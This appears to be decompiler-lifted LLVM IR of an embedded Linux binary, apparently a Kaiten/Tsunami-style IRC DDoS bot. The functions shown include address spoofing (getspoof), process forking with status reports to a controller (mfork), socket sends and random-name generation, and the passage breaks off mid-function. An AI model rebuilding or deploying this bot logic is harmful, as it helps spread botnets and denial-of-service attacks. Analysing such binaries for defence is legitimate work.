@global_var_1001a010.514 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_100130e4.515 = constant i32 1207959664
@global_var_10013110.516 = constant i32 1207959620
@global_var_10013280.517 = constant i32 1207959600
@global_var_1001333c.518 = constant i32 1207959560
@global_var_100133d8.519 = constant [3 x i8] c"|c\00"
@global_var_1001342c.520 = constant i32 956301313
@global_var_100134d8.521 = constant [3 x i8] c"|c\00"
@global_var_1001352c.522 = constant i32 939524097
@global_var_100135c4.523 = constant i32 1207959600
@global_var_10013704.524 = constant i32 1207959608
@global_var_1002f098.525 = global i32 0
@global_var_1001a06c.526 = constant i32 0
@global_var_10013824.527 = constant i32 1207959568
@global_var_100138d0.528 = constant i32 1207959560
@global_var_1001a034.529 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_100139b4.530 = constant i32 1207959620
@global_var_100139d4.531 = constant i32 1207959592
@global_var_100139e0.532 = constant i32 939524096
@global_var_1001a050.533 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_10013ae8.534 = constant i32 1207959620
@global_var_10013b1c.535 = constant i32 939524096
@global_var_1001a070.536 = constant i32 268516224
@global_var_10033950.538 = global i32 0
@global_var_1002f09c.539 = local_unnamed_addr global i32 0
@global_var_10013f40.541 = constant i32 1207960848
@global_var_1002f0a4.542 = local_unnamed_addr global i32 0
@global_var_1001a098.543 = constant i32 771751936
@global_var_10033c1c.544 = global i32 0
@global_var_10014030.545 = constant [3 x i8] c"8a\00"
@global_var_1001403c.546 = constant i32 939524097
@global_var_10014110.547 = constant i32 939524097
@global_var_100141e4.548 = constant i32 939524097
@global_var_10014210.549 = constant i32 939524100
@global_var_100142f0.550 = constant i32 1207959684
@global_var_1001446c.551 = constant i32 939589631
@global_var_1001a0b4.552 = constant i32 1912602624
@global_var_1001a0a0.553 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1001a0b8.554 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1001a0d0.555 = constant [11 x i8] c"nameserver\00"
@global_var_1001a0dc.556 = constant [7 x i8] c"domain\00"
@global_var_1001a0e4.557 = constant [7 x i8] c"search\00"
@global_var_100147a4.558 = constant i32 1207959568
@global_var_100147ac.559 = constant i32 939524099
@global_var_1001485c.560 = constant i32 939524118
@global_var_10033c38.561 = global i32 0
@global_var_1001492c.562 = constant [3 x i8] c"8`\00"
@global_var_1002ef08.563 = global i32 0
@global_var_10014af4.564 = constant i32 939524129
@global_var_1002f0a8.565 = local_unnamed_addr global i32 0
@global_var_10014b68.566 = constant [3 x i8] c"8`\00"
@global_var_10014ba0.567 = constant i32 939524129
@global_var_1002f0b0.568 = local_unnamed_addr global i32 0
@global_var_1002f0ac.569 = local_unnamed_addr global i32 0
@global_var_10014d24.570 = constant i32 1207959580
@global_var_1002f0b4.571 = local_unnamed_addr global i32 0
@global_var_10014de8.572 = constant i32 939524108
@global_var_1002f0b8.573 = local_unnamed_addr global i32 0
@global_var_1002f0bc.574 = local_unnamed_addr global i32 0
@global_var_1001520c.575 = constant i32 939524171
@global_var_100152bc.576 = constant i32 939524105
@global_var_1001a0ec.577 = constant i32 268524088
@global_var_10015bfc.578 = constant i32 1023414273
@global_var_10015c78.579 = constant i32 939524098
@global_var_10015c94.580 = constant i32 939524192
@global_var_10015cb8.582 = constant i32 939524520
@global_var_1002f0c5.583 = global i32 0
@global_var_1001a100.584 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_1001a118.585 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_10015dd4.586 = constant [3 x i8] c"8`\00"
@global_var_1001a150.587 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_10015e64.588 = constant [3 x i8] c"8`\00"
@global_var_10015e94.589 = constant [3 x i8] c"8`\00"
@global_var_10015fec.594 = constant [3 x i8] c";A\00"
@global_var_1001a168.595 = constant [24 x i8] c"Cannot register service\00"
@global_var_100160ac.596 = constant i32 939524096
@global_var_1002f0c8.597 = local_unnamed_addr global i32 0
@global_var_1001a190.598 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_10016258.599 = constant i32 1207959664
@global_var_100162bc.600 = constant i32 939524096
@global_var_100163a8.601 = constant [3 x i8] c"8`\00"
@global_var_1001a1c0.602 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_100165a0.603 = constant [3 x i8] c"9 \00"
@global_var_100165ac.604 = constant i32 939524193
@global_var_10016614.606 = constant i32 939524101
@global_var_10016700.607 = constant i32 939524124
@global_var_10016778.608 = constant i32 1207960116
@global_var_10016790.609 = constant i32 939524105
@global_var_10016908.610 = constant [3 x i8] c"9 \00"
@global_var_1001a1d4.611 = constant [3 x i8] c"%x\00"
@global_var_10016994.612 = constant i32 939524124
@global_var_100169b8.613 = constant i32 939524193
@global_var_1001a1d8.614 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001a1e4.615 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_100170a4.616 = constant i32 1207959560
@global_var_1001a1fa.617 = constant i32 9587
@global_var_1001a1f8.618 = constant [3 x i8] c": \00"
@global_var_1001a1fc.619 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_1001a3fc.620 = constant i32 0
@global_var_1001a48c.621 = constant [13 x i8] c"RPC: Success\00"
@global_var_1001a204.622 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_1001a220.623 = constant [5 x i8] c"%s: \00"
@global_var_1001a228.624 = constant [4 x i8] c" - \00"
@global_var_10017554.625 = constant i32 1207959608
@global_var_1001a2ac.626 = constant i32 -11024
@global_var_1001a22c.627 = constant [13 x i8] c"; errno = %s\00"
@global_var_100176b8.628 = constant i32 1207959776
@global_var_1001a294.635 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_1002a65c.636 = global i32 0
@global_var_1002a658.637 = global i32 268458292
@global_var_1002f0d0.12 = local_unnamed_addr global i8 0
@global_var_1002efbc.21 = local_unnamed_addr global i8 0
@global_var_1002efc0.27 = external local_unnamed_addr global i8*
@global_var_1002efc3.177 = external local_unnamed_addr global i8*
@global_var_1002efc2.178 = external local_unnamed_addr global i8*
@global_var_1002efc1.179 = external global i8*
@global_var_1002ec10.232 = global i16 288
@global_var_1002f05c.371 = local_unnamed_addr global i16* null
@global_var_1002ec60.367 = local_unnamed_addr global i16 272
@global_var_1002eeec.540 = local_unnamed_addr global i16 1
@global_var_1002f0c4.581 = local_unnamed_addr global i16 0
@global_var_10017ac8.30 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002f0d0.12, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002a684.14 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002a684.14 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002a684.14 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002f0d0.12, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002f0d0.12, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1002a668.18, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1002a668.18 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268452024, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 31336), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000238 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000238, i32* %stack_var_-64, align 4
  %v2_1000025c = load i8, i8* %arg1, align 1
  %v3_1000026c = icmp eq i8 %v2_1000025c, 42
  br i1 %v3_1000026c, label %dec_label_pc_100002a4, label %dec_label_pc_10000274

dec_label_pc_10000274:                            ; preds = %entry
  %v3_10000278 = icmp eq i8 %v2_1000025c, 63
  br i1 %v3_10000278, label %dec_label_pc_10000318, label %dec_label_pc_10000280

dec_label_pc_10000280:                            ; preds = %dec_label_pc_10000274
  %v3_10000284 = icmp eq i8 %v2_1000025c, 0
  br i1 %v3_10000284, label %dec_label_pc_10000290, label %dec_label_pc_10000374

dec_label_pc_10000290:                            ; preds = %dec_label_pc_10000280
  %v2_10000294 = load i8, i8* %tmp, align 1
  %v3_10000294 = zext i8 %v2_10000294 to i32
  br label %dec_label_pc_100003f8

dec_label_pc_100002a4:                            ; preds = %entry
  %v2_100002a8 = add i32 %tmp9, 1
  store i32 268436152, i32* @lr, align 4
  %v5_100002b4 = inttoptr i32 %v2_100002a8 to i8*
  %v6_100002b4 = call i32 @strwildmatch(i8* %v5_100002b4, i32 %arg2, i32 %tmp9)
  %v3_100002bc = icmp eq i32 %v6_100002b4, 0
  br i1 %v3_100002bc, label %dec_label_pc_10000304, label %dec_label_pc_100002c4

dec_label_pc_100002c4:                            ; preds = %dec_label_pc_100002a4
  %v2_100002c8 = load i8, i8* %tmp, align 1
  %v3_100002d0 = icmp eq i8 %v2_100002c8, 0
  br i1 %v3_100002d0, label %dec_label_pc_1000030c, label %dec_label_pc_100002d8

dec_label_pc_100002d8:                            ; preds = %dec_label_pc_100002c4
  %v2_100002dc = add i32 %arg2, 1
  store i32 268436204, i32* @lr, align 4
  %v6_100002e8 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_100002dc, i32 %arg2)
  %v3_100002f0 = icmp eq i32 %v6_100002e8, 0
  br i1 %v3_100002f0, label %dec_label_pc_10000304, label %dec_label_pc_1000030c

dec_label_pc_10000304:                            ; preds = %dec_label_pc_100002d8, %dec_label_pc_100002a4
  br label %dec_label_pc_1000030c

dec_label_pc_1000030c:                            ; preds = %dec_label_pc_100002c4, %dec_label_pc_100002d8, %dec_label_pc_10000304
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10000304 ], [ 1, %dec_label_pc_100002d8 ], [ 1, %dec_label_pc_100002c4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000318:                            ; preds = %dec_label_pc_10000274
  %v2_1000031c = load i8, i8* %tmp, align 1
  %v3_10000324 = icmp eq i8 %v2_1000031c, 0
  br i1 %v3_10000324, label %dec_label_pc_10000368, label %dec_label_pc_1000032c

dec_label_pc_1000032c:                            ; preds = %dec_label_pc_10000318
  %v1_10000330 = add i32 %tmp9, 1
  %v2_10000338 = add i32 %arg2, 1
  store i32 268436296, i32* @lr, align 4
  %v4_10000344 = inttoptr i32 %v1_10000330 to i8*
  %v5_10000344 = call i32 @strwildmatch(i8* %v4_10000344, i32 %v2_10000338, i32 %arg2)
  %v3_1000034c = icmp ne i32 %v5_10000344, 0
  %. = zext i1 %v3_1000034c to i32
  br label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %dec_label_pc_1000032c, %dec_label_pc_10000318
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10000318 ], [ %., %dec_label_pc_1000032c ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000280
  %v3_10000378 = load i8, i8* %arg1, align 1
  %v4_10000378 = zext i8 %v3_10000378 to i32
  store i32 268436364, i32* @lr, align 4
  %v3_10000388 = call i32 @__GI_toupper(i32 %v4_10000378, i32 %tmp9)
  %v3_10000394 = load i8, i8* %tmp, align 1
  %v4_10000394 = zext i8 %v3_10000394 to i32
  store i32 268436392, i32* @lr, align 4
  %v3_100003a4 = call i32 @__GI_toupper(i32 %v4_10000394, i32 %arg2)
  %v4_100003ac = icmp eq i32 %v3_10000388, %v3_100003a4
  br i1 %v4_100003ac, label %dec_label_pc_100003b4, label %dec_label_pc_100003f0

dec_label_pc_100003b4:                            ; preds = %dec_label_pc_10000374
  %v1_100003b8 = add i32 %tmp9, 1
  %v2_100003c0 = add i32 %arg2, 1
  store i32 268436432, i32* @lr, align 4
  %v4_100003cc = inttoptr i32 %v1_100003b8 to i8*
  %v5_100003cc = call i32 @strwildmatch(i8* %v4_100003cc, i32 %v2_100003c0, i32 %arg2)
  %v3_100003d4 = icmp ne i32 %v5_100003cc, 0
  %.8 = zext i1 %v3_100003d4 to i32
  br label %dec_label_pc_100003f0

dec_label_pc_100003f0:                            ; preds = %dec_label_pc_100003b4, %dec_label_pc_10000374
  %storemerge = phi i32 [ 1, %dec_label_pc_10000374 ], [ %.8, %dec_label_pc_100003b4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_10000368, %dec_label_pc_1000030c, %dec_label_pc_10000290, %dec_label_pc_100003f0
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_1000030c ], [ %storemerge3, %dec_label_pc_10000368 ], [ %v3_10000294, %dec_label_pc_10000290 ], [ %storemerge, %dec_label_pc_100003f0 ]
  %v2_10000400 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10000400, i32* @r11, align 4
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100003f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000030c, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000041c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000041c, i32* %stack_var_-144, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_1002f0ec.20 to i32), i32* @r3, align 4
  %v2_100004a0 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436652, i32* @lr, align 4
  %v4_100004a8 = call i32 @vsprintf(i32 ptrtoint (i32* @global_var_1002f0ec.20 to i32), i32 %arg2, i32 %v2_100004a0, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 ptrtoint (i32* @global_var_1002f0ec.20 to i32), i32* @r3, align 4
  %v0_100004b4 = call i32 @__GI_strlen()
  store i32 268436688, i32* @lr, align 4
  %v4_100004cc = call i32 @write(i32 %arg1, i32 ptrtoint (i32* @global_var_1002f0ec.20 to i32), i32 %v0_100004b4, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v2_100004d8 = load i32, i32* %stack_var_-144, align 4
  store i32 %v2_100004d8, i32* @r11, align 4
  ret i32 %v4_100004cc

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002f0ec.20 to i32), { 1, 2, 0, 3 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000050c = load i8, i8* @global_var_1002efbc.21, align 1
  %v3_10000514 = icmp eq i8 %v3_1000050c, 1
  br i1 %v3_10000514, label %dec_label_pc_1000051c, label %dec_label_pc_10000548

dec_label_pc_1000051c:                            ; preds = %entry
  %v3_10000520 = load i32, i32* @global_var_1002efd8.22, align 4
  %v6_10000538 = call i32 @Send(i32 %v3_10000520, i32 ptrtoint ([30 x i8]* @global_var_10017a98.23 to i32), i32 %arg1, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_1000064c

dec_label_pc_10000548:                            ; preds = %entry
  store i32 268436812, i32* @lr, align 4
  %v0_10000548 = call i32 @fork()
  %v3_10000558 = icmp eq i32 %v0_10000548, 0
  br i1 %v3_10000558, label %dec_label_pc_10000560, label %dec_label_pc_1000056c

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000548
  br label %dec_label_pc_1000064c

dec_label_pc_1000056c:                            ; preds = %dec_label_pc_10000548
  %v3_10000570 = load i32, i32* @global_var_1002efc8.25, align 4
  %v1_10000574 = add i32 %v3_10000570, 1
  store i32 %v1_10000574, i32* @global_var_1002efc8.25, align 4
  %v1_10000588 = mul i32 %v1_10000574, 4
  %v1_1000058c = add i32 %v1_10000588, 4
  store i32 %v1_1000058c, i32* @r3, align 4
  store i32 268436888, i32* @lr, align 4
  %v0_10000594 = call i32 @malloc()
  %v3_100005f02 = load i32, i32* @global_var_1002efc8.25, align 4
  %v3_100005fc4 = icmp eq i32 %v3_100005f02, 1
  br i1 %v3_100005fc4, label %dec_label_pc_10000604, label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ac
  %storemerge16 = phi i32 [ %v1_100005e4, %dec_label_pc_100005ac ], [ 0, %dec_label_pc_1000056c ]
  %v1_100005b0 = mul i32 %storemerge16, 4
  %v2_100005bc = add i32 %v1_100005b0, %v0_10000594
  store i32 %v2_100005bc, i32* @r10, align 4
  %v3_100005d0 = load i32, i32* @global_var_1002efec.26, align 4
  %v2_100005d4 = add i32 %v3_100005d0, %v1_100005b0
  %v1_100005d8 = inttoptr i32 %v2_100005d4 to i32*
  %v2_100005d8 = load i32, i32* %v1_100005d8, align 4
  %v2_100005dc = inttoptr i32 %v2_100005bc to i32*
  store i32 %v2_100005d8, i32* %v2_100005dc, align 4
  %v1_100005e4 = add i32 %storemerge16, 1
  %v3_100005f0 = load i32, i32* @global_var_1002efc8.25, align 4
  %v1_100005f4 = add i32 %v3_100005f0, -1
  %v3_100005fc = icmp ugt i32 %v1_100005f4, %v1_100005e4
  br i1 %v3_100005fc, label %dec_label_pc_100005ac, label %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge

dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge: ; preds = %dec_label_pc_100005ac
  br label %dec_label_pc_10000604

dec_label_pc_10000604:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge
  %v3_10000608 = phi i32 [ %v3_100005f0, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge ], [ %v3_100005f02, %dec_label_pc_1000056c ]
  %v1_1000060c = mul i32 %v3_10000608, 4
  %v2_10000618 = add i32 %v0_10000594, -4
  %v1_1000061c = add i32 %v2_10000618, %v1_1000060c
  %v2_10000624 = inttoptr i32 %v1_1000061c to i32*
  store i32 %v0_10000548, i32* %v2_10000624, align 4
  %v3_1000062c = load i32, i32* @global_var_1002efec.26, align 4
  store i32 %v3_1000062c, i32* @r3, align 4
  store i32 268437048, i32* @lr, align 4
  %v0_10000634 = call i32 @free()
  store i32 %v0_10000594, i32* @global_var_1002efec.26, align 4
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000560, %dec_label_pc_1000051c, %dec_label_pc_10000604
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_1000051c ], [ 0, %dec_label_pc_10000560 ], [ %v0_10000548, %dec_label_pc_10000604 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100005e4, { 1, 0 }
  uselistorder i32 %v1_100005b0, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100005f02, { 1, 0 }
  uselistorder i32 %v0_10000594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000064c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000604, { 1, 0 }
  uselistorder label %dec_label_pc_100005ac, { 1, 0 }
}

define i32 @getspoof() local_unnamed_addr {
entry:
  %v3_10000684 = load i8*, i8** @global_var_1002efc0.27, align 4
  %v4_10000684 = ptrtoint i8* %v3_10000684 to i32
  %v3_10000688 = icmp eq i8* %v3_10000684, null
  br i1 %v3_10000688, label %dec_label_pc_10000690, label %dec_label_pc_100006a0

dec_label_pc_10000690:                            ; preds = %entry
  store i32 268437140, i32* @lr, align 4
  %v0_10000690 = call i32 @random()
  br label %dec_label_pc_10000704

dec_label_pc_100006a0:                            ; preds = %entry
  %v3_100006a4 = load i32, i32* @global_var_1002efc4.28, align 4
  %v3_100006a8 = icmp eq i32 %v3_100006a4, 1
  br i1 %v3_100006a8, label %dec_label_pc_100006b0, label %dec_label_pc_100006c8

dec_label_pc_100006b0:                            ; preds = %dec_label_pc_100006a0
  store i32 %v4_10000684, i32* @r3, align 4
  %v3_100006bc = call i32 @ntohl(i32 %v4_10000684, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_10000704

dec_label_pc_100006c8:                            ; preds = %dec_label_pc_100006a0
  store i32 268437196, i32* @lr, align 4
  %v0_100006c8 = call i32 @random()
  %v3_100006d8 = load i32, i32* @global_var_1002efc4.28, align 4
  %v2_100006dc = urem i32 %v0_100006c8, %v3_100006d8
  %v3_100006ec = load i8*, i8** @global_var_1002efc0.27, align 4
  %v4_100006ec = ptrtoint i8* %v3_100006ec to i32
  %v2_100006f0 = add i32 %v4_100006ec, %v2_100006dc
  %v1_100006f4 = add i32 %v2_100006f0, 1
  store i32 %v1_100006f4, i32* @r3, align 4
  %v2_100006fc = call i32 @ntohl(i32 %v1_100006f4, i32 %v2_100006f0)
  br label %dec_label_pc_10000704

dec_label_pc_10000704:                            ; preds = %dec_label_pc_100006b0, %dec_label_pc_10000690, %dec_label_pc_100006c8
  %stack_var_-24.0 = phi i32 [ %v0_10000690, %dec_label_pc_10000690 ], [ %v3_100006bc, %dec_label_pc_100006b0 ], [ %v2_100006fc, %dec_label_pc_100006c8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000684, { 1, 0 }
  uselistorder i32 (i32, i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_10000704, { 2, 0, 1 }
}

define i32 @filter(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10000778 = add i32 %arg1, -1
  br label %dec_label_pc_10000764

dec_label_pc_10000740:                            ; preds = %dec_label_pc_10000790, %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000744 = call i32 @__GI_strlen()
  %v1_10000758 = add i32 %v0_10000744, %v2_10000778
  %v3_10000760 = inttoptr i32 %v1_10000758 to i8*
  store i8 0, i8* %v3_10000760, align 1
  br label %dec_label_pc_10000764

dec_label_pc_10000764:                            ; preds = %entry, %dec_label_pc_10000740
  store i32 %arg1, i32* @r3, align 4
  %v0_10000768 = call i32 @__GI_strlen()
  %v1_1000077c = add i32 %v0_10000768, %v2_10000778
  %v1_10000780 = inttoptr i32 %v1_1000077c to i8*
  %v2_10000780 = load i8, i8* %v1_10000780, align 1
  %v3_10000788 = icmp eq i8 %v2_10000780, 13
  br i1 %v3_10000788, label %dec_label_pc_10000740, label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000794 = call i32 @__GI_strlen()
  %v1_100007a8 = add i32 %v0_10000794, %v2_10000778
  %v1_100007ac = inttoptr i32 %v1_100007a8 to i8*
  %v2_100007ac = load i8, i8* %v1_100007ac, align 1
  %v3_100007b4 = icmp eq i8 %v2_100007ac, 10
  br i1 %v3_100007b4, label %dec_label_pc_10000740, label %dec_label_pc_100007bc

dec_label_pc_100007bc:                            ; preds = %dec_label_pc_10000790
  ret i32 %v0_10000794

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000764, { 1, 0 }
}

define i32 @makestring() local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  store i32 268437488, i32* @lr, align 4
  %v0_100007ec = call i32 @random()
  %v2_10000808 = srem i32 %v0_100007ec, 5
  %v1_10000824 = add nsw i32 %v2_10000808, 4
  %v1_10000830 = add nsw i32 %v2_10000808, 5
  store i32 %v1_10000830, i32* @r3, align 4
  store i32 268437564, i32* @lr, align 4
  %v0_10000838 = call i32 @malloc()
  store i32 268437604, i32* @lr, align 4
  %v3_10000860 = call i32 @__GI_memset(i32 %v0_10000838, i32 0, i32 %v1_10000830)
  store i32 268437624, i32* @lr, align 4
  %v3_10000874 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_10017ab8.29 to i32), i32 ptrtoint ([2 x i8]* @global_var_10017ac8.30 to i32))
  %v3_10000884 = icmp eq i32 %v3_10000874, 0
  br i1 %v3_10000884, label %dec_label_pc_100008fc.preheader, label %dec_label_pc_10000910

dec_label_pc_100008fc.preheader:                  ; preds = %entry
  %v2_100009048 = icmp sgt i32 %v2_10000808, -4
  br i1 %v2_100009048, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000898:                            ; preds = %dec_label_pc_100008fc.preheader, %dec_label_pc_10000898
  %storemerge711 = phi i32 [ %v1_100008f4, %dec_label_pc_10000898 ], [ 0, %dec_label_pc_100008fc.preheader ]
  store i32 268437676, i32* @lr, align 4
  %v0_100008a8 = call i32 @random()
  %v2_100008c4 = srem i32 %v0_100008a8, 26
  %fold = add nsw i32 %v2_100008c4, 65
  %v1_100008ec = trunc i32 %fold to i8
  %v2_100008ec = load i32, i32* @r29, align 4
  %v3_100008ec = inttoptr i32 %v2_100008ec to i8*
  store i8 %v1_100008ec, i8* %v3_100008ec, align 1
  %v1_100008f4 = add nuw nsw i32 %storemerge711, 1
  %v2_10000904 = icmp slt i32 %v1_100008f4, %v1_10000824
  br i1 %v2_10000904, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000910:                            ; preds = %entry
  store i32 268437780, i32* @lr, align 4
  %v0_10000910 = call i32 @random()
  store i32 268437788, i32* @lr, align 4
  %v0_10000918 = call i32 @random()
  %v0_10000920 = load i32, i32* @r29, align 4
  %v2_10000920 = mul i32 %v0_10000920, %v0_10000918
  %v2_1000093c = srem i32 %v2_10000920, 45402
  %v2_1000099c12 = icmp sgt i32 %v2_1000093c, -1
  %v2_10000974 = ptrtoint i32* %stack_var_-1076 to i32
  br i1 %v2_1000099c12, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000910, %dec_label_pc_10000974
  %storemerge615 = phi i32 [ %v1_1000098c, %dec_label_pc_10000974 ], [ 0, %dec_label_pc_10000910 ]
  store i32 268437896, i32* @lr, align 4
